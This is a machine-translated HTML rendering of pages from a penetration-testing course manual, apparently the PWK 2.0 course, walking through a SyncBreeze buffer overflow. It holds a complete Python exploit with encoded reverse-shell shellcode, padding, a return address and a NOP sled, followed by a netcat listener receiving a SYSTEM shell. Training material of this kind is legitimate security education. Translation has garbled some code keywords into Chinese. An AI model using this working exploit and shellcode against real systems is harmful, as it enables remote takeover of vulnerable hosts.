<div style="position:absolute;top:84204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 shellcode 并启动我们的漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:84237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，在这种特殊情况下，我们还有另一个障碍需要克服。</font><font style="vertical-align: inherit;">在上一步中，我们</font></font></nobr></div>
<div style="position:absolute;top:84256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 msfvenom 生成了一个编码的 shellcode。</font><font style="vertical-align: inherit;">由于编码的原因，shellcode 不是</font></font></nobr></div>
<div style="position:absolute;top:84276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可直接执行，因此前面有解码器存根。</font><font style="vertical-align: inherit;">这个存根的工作是迭代</font></font></nobr></div>
<div style="position:absolute;top:84295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对编码的 shellcode 字节进行解码，并将它们解码回原始的可执行形式。</font><font style="vertical-align: inherit;">为了</font></font></nobr></div>
<div style="position:absolute;top:84314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要执行此任务，解码器需要在内存中收集其地址，然后从那里查看一些</font></font></nobr></div>
<div style="position:absolute;top:84334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字节以定位需要解码的编码 shellcode。</font><font style="vertical-align: inherit;">作为过程的一部分</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:84395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">324 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Rapid7，2018），https://www.rapid7.com/db/modules/encoder/x86/shikata_ga_nai</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:84523;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="72"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 72 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:84556;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:85633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:85633;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:85633;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">392</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集解码器存根在内存中的位置，代码执行一系列汇编</font></font></nobr></div>
<div style="position:absolute;top:84671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指令，通常称为 GetPC 例程。</font><font style="vertical-align: inherit;">这本质上是一个简短的例程</font></font></nobr></div>
<div style="position:absolute;top:84690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 EIP 寄存器（有时称为程序计数器或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PC</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font><font style="vertical-align: inherit;">的值移动</font><font style="vertical-align: inherit;">到</font></font></nobr></div>
<div style="position:absolute;top:84710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个寄存器。</font></font></nobr></div>
<div style="position:absolute;top:84743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与其他 GetPC 例程一样，shikata_ga_nai 使用的那些例程有一个不幸的副作用</font></font></nobr></div>
<div style="position:absolute;top:84762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在堆栈顶部和周围写入一些数据。</font><font style="vertical-align: inherit;">这最终会破坏至少几个</font></font></nobr></div>
<div style="position:absolute;top:84781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接近 ESP 寄存器指向的地址的字节。</font><font style="vertical-align: inherit;">不幸的是，这个小小的改变</font></font></nobr></div>
<div style="position:absolute;top:84800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈对我们来说是一个问题，因为解码器刚好从 ESP 指向的地址开始</font></font></nobr></div>
<div style="position:absolute;top:84820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登记。</font><font style="vertical-align: inherit;">简而言之，GetPC 例程执行最终改变了解码器本身的几个字节</font></font></nobr></div>
<div style="position:absolute;top:84839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（可能还有编码的 shellcode），它最终会导致解码过程失败并崩溃</font></font></nobr></div>
<div style="position:absolute;top:84859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标进程。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85482;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 221：解码器覆盖自身</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:85513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">避免此问题的一种方法是向后调整 ESP，利用装配说明</font></font></nobr></div>
<div style="position:absolute;top:85533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DEC ESP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SUB ESP, 0xXX</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，在执行解码器之前。</font><font style="vertical-align: inherit;">或者，我们可以创建一个</font></font></nobr></div>
<div style="position:absolute;top:85552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的 JMP ESP 的宽“着陆垫”，这样当执行落在这个垫上的任何地方时，它会</font></font></nobr></div>
<div style="position:absolute;top:85571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续我们的有效载荷。</font><font style="vertical-align: inherit;">这听起来可能很复杂，但我们只是在我们的有效载荷之前加上</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:85711;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="73"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 73 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:85744;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:86821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:86821;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:86821;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">393</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:85840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一系列 No Operation（或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NOP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）指令，其操作码值为 0x90。</font><font style="vertical-align: inherit;">正如名字</font></font></nobr></div>
<div style="position:absolute;top:85859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建议，这些指令什么都不做，只是将执行传递给下一条指令。</font><font style="vertical-align: inherit;">用于</font></font></nobr></div>
<div style="position:absolute;top:85878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样，这些指令，也定义为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NOP sled</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NOP slide</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，将让 CPU “slide”通过</font></font></nobr></div>
<div style="position:absolute;top:85898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NOP，直到达到有效载荷。</font></font></nobr></div>
<div style="position:absolute;top:85931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这两种情况下，当执行到达 shellcode 解码器时，堆栈指针指向很远</font></font></nobr></div>
<div style="position:absolute;top:85950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离它足够远，以免在 GetPC 例程覆盖一些</font></font></nobr></div>
<div style="position:absolute;top:85969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈上的字节数。</font></font></nobr></div>
<div style="position:absolute;top:86002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加 NOP 雪橇后，我们的最终漏洞利用类似于下面的清单 362：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:86054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:86088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试：</font></font></nobr></div>
<div style="position:absolute;top:86105;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n发送邪恶的缓冲区..."</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:86139;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode = ("\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"</font></font></b></nobr></div>
<div style="position:absolute;top:86156;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"</font></font></b></nobr></div>
<div style="position:absolute;top:86173;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59"</font></font></b></nobr></div>
<div style="position:absolute;top:86190;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48"</font></font></b></nobr></div>
<div style="position:absolute;top:86207;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f"</font></font></b></nobr></div>
<div style="position:absolute;top:86224;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6"</font></font></b></nobr></div>
<div style="position:absolute;top:86241;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4"</font></font></b></nobr></div>
<div style="position:absolute;top:86257;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff"</font></font></b></nobr></div>
<div style="position:absolute;top:86274;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1"</font></font></b></nobr></div>
<div style="position:absolute;top:86292;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8"</font></font></b></nobr></div>
<div style="position:absolute;top:86309;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2"</font></font></b></nobr></div>
<div style="position:absolute;top:86326;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62"</font></font></b></nobr></div>
<div style="position:absolute;top:86342;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e"</font></font></b></nobr></div>
<div style="position:absolute;top:86359;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2"</font></font></b></nobr></div>
<div style="position:absolute;top:86376;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e"</font></font></b></nobr></div>
<div style="position:absolute;top:86393;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49"</font></font></b></nobr></div>
<div style="position:absolute;top:86410;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70"</font></font></b></nobr></div>
<div style="position:absolute;top:86427;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23"</font></font></b></nobr></div>
<div style="position:absolute;top:86444;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f"</font></font></b></nobr></div>
<div style="position:absolute;top:86461;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56"</font></font></b></nobr></div>
<div style="position:absolute;top:86478;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8"</font></font></b></nobr></div>
<div style="position:absolute;top:86495;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b"</font></font></b></nobr></div>
<div style="position:absolute;top:86512;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6"</font></font></b></nobr></div>
<div style="position:absolute;top:86529;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x5f\xa3\x05\x74\x5f\xe6")</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86563;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">填充物 = "A" * 780</font></font></nobr></div>
<div style="position:absolute;top:86580;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eip = "\x83\x0c\x09\x10"</font></font></nobr></div>
<div style="position:absolute;top:86597;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">偏移=“C”* 4</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:86614;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nops = "\x90" * 10</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86648;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer = 填充符 + eip + 偏移量 + </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nops + shellcode</font></font></font></b></nobr></div>
<div style="position:absolute;top:86682;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">content = "username=" + inputBuffer + "&amp;password=A"</font></font></nobr></div>
<div style="position:absolute;top:86716;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer = "POST /login HTTP/1.1\r\n"</font></font></nobr></div>
<div style="position:absolute;top:86733;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "主机：10.11.0.22\r\n"</font></font></nobr></div>
<div style="position:absolute;top:86750;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "用户代理：Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefo</font></font></nobr></div>
<div style="position:absolute;top:86767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x/52.0\r\n" </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:86899;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="74"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 74 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:86932;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:88009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:88009;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:88009;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">394</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87028;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "接受：text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r</font></font></nobr></div>
<div style="position:absolute;top:87044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\n"</font></font></nobr></div>
<div style="position:absolute;top:87061;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "Accept-Language: en-US,en;q=0.5\r\n"</font></font></nobr></div>
<div style="position:absolute;top:87078;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "引用者：http://10.11.0.22/login\r\n"</font></font></nobr></div>
<div style="position:absolute;top:87096;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "连接：关闭\r\n"</font></font></nobr></div>
<div style="position:absolute;top:87112;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "Content-Type: application/x-www-form-urlencoded\r\n"</font></font></nobr></div>
<div style="position:absolute;top:87129;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "内容长度："+str(len(content))+"\r\n"</font></font></nobr></div>
<div style="position:absolute;top:87146;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "\r\n"</font></font></nobr></div>
<div style="position:absolute;top:87180;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += 内容</font></font></nobr></div>
<div style="position:absolute;top:87214;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</font></font></nobr></div>
<div style="position:absolute;top:87248;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.connect(("10.11.0.22", 80))</font></font></nobr></div>
<div style="position:absolute;top:87265;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.send（缓冲区）</font></font></nobr></div>
<div style="position:absolute;top:87299;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.close()</font></font></nobr></div>
<div style="position:absolute;top:87333;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n完成了，你得到了一个反向 shell 吗？"</font></font></nobr></div>
<div style="position:absolute;top:87367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了：</font></font></nobr></div>
<div style="position:absolute;top:87384;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n无法连接！"</font></font></nobr></div>
<div style="position:absolute;top:87403;left:372"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 362 - 最终利用代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑到反向 shell 负载，我们在端口 443 上配置了一个 Netcat 侦听器</font></font></nobr></div>
<div style="position:absolute;top:87452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击机器并执行漏洞利用脚本。</font><font style="vertical-align: inherit;">在短期内，我们应该希望收到一个</font></font></nobr></div>
<div style="position:absolute;top:87471;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自我们受害者机器的</font><i><font style="vertical-align: inherit;">SYSTEM</font></i><font style="vertical-align: inherit;">反向 shell：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lnvp 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:87523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:87540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 57692 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:87557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.17134.590]</font></font></nobr></div>
<div style="position:absolute;top:87574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2018 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:87608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:87625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:87642;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nt权限\系统</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:87695;left:359"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 363 - 收到反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的！</font><font style="vertical-align: inherit;">有用。</font><font style="vertical-align: inherit;">我们已经为缓冲区溢出漏洞创建了一个完整的漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:87744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">挠。</font><font style="vertical-align: inherit;">但是，仍有一个小不便需要克服。</font><font style="vertical-align: inherit;">请注意，一旦我们退出</font></font></nobr></div>
<div style="position:absolute;top:87763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向外壳，SyncBreeze 服务崩溃并退出。</font><font style="vertical-align: inherit;">这远非理想。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:87798;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.9.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 更新您的 PoC 以包含有效负载。</font></font></nobr></div>
<div style="position:absolute;top:87856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 尝试在不使用 NOP 雪橇的情况下执行您的漏洞利用并观察解码器</font></font></nobr></div>
<div style="position:absolute;top:87876;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">破坏堆栈。</font></font></nobr></div>
<div style="position:absolute;top:87904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 将 NOP 雪橇添加到您的 PoC 并从 SyncBreeze 获取外壳。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:88087;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="75"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 75 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:88120;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:89197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:89197;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:89197;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">395</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88216;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.10</font></font></i></nobr></div>
<div style="position:absolute;top:88216;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">改进漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit shellcode 执行后的默认退出方法是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExitProcess</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> API。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:88273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当反向 shell 终止时，exit 方法将关闭整个 web 服务进程，</font></font></nobr></div>
<div style="position:absolute;top:88292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效地杀死 SyncBreeze 服务并导致它崩溃。</font></font></nobr></div>
<div style="position:absolute;top:88325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们正在利用的程序是一个线程应用程序，在这种情况下，我们可以尽量避免</font></font></nobr></div>
